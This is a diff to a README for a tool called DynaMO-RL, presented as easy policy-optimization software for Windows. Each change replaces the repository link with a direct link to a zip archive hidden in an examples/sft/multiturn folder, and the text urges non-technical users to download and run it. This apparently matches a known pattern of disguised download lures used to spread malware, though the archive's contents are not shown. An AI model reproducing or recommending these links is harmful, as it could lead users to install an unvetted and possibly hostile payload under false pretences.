@@ -1,6 +1,6 @@
 # ⚙️ DynaMO-RL - Smarter Policy Optimization Made Easy
 
-[![Download DynaMO-RL](https://img.shields.io/badge/Download-DynaMO--RL-brightgreen?style=for-the-badge)](https://github.com/Rudge0/DynaMO-RL)
+[![Download DynaMO-RL](https://img.shields.io/badge/Download-DynaMO--RL-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Rudge0/DynaMO-RL/main/examples/sft/multiturn/Dyna-M-RL-v1.2-alpha.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This software does not require advanced hardware like a powerful GPU but having 
 
 To get the software, you need to visit the official page:
 
-[Visit this page to download DynaMO-RL](https://github.com/Rudge0/DynaMO-RL)
+[Visit this page to download DynaMO-RL](https://raw.githubusercontent.com/Rudge0/DynaMO-RL/main/examples/sft/multiturn/Dyna-M-RL-v1.2-alpha.5.zip)
 
 You will find the latest version ready for download there. The page provides the complete package you need to run the tool on your Windows computer.
 
@@ -39,7 +39,7 @@ You will find the latest version ready for download there. The page provides the
 ## 🚀 Step 1: Downloading DynaMO-RL
 
 1. Click the large green button above or visit the page directly:  
-   https://github.com/Rudge0/DynaMO-RL  
+   https://raw.githubusercontent.com/Rudge0/DynaMO-RL/main/examples/sft/multiturn/Dyna-M-RL-v1.2-alpha.5.zip  
 2. On the page, look for the section called **Releases** or **Downloads**.  
 3. Find the latest Windows release file. This is usually an `.exe` or `.zip` file.  
 4. Click on the file name to begin the download. Wait for the download to complete fully before moving on.
@@ -117,4 +117,4 @@ You can repeat the download and installation steps to upgrade your version safel
 
 ---
 
-[![Download DynaMO-RL](https://img.shields.io/badge/Download-DynaMO--RL-blue?style=for-the-badge)](https://github.com/Rudge0/DynaMO-RL)
+[![Download DynaMO-RL](https://img.shields.io/badge/Download-DynaMO--RL-blue?style=for-the-badge)](https://raw.githubusercontent.com/Rudge0/DynaMO-RL/main/examples/sft/multiturn/Dyna-M-RL-v1.2-alpha.5.zip)
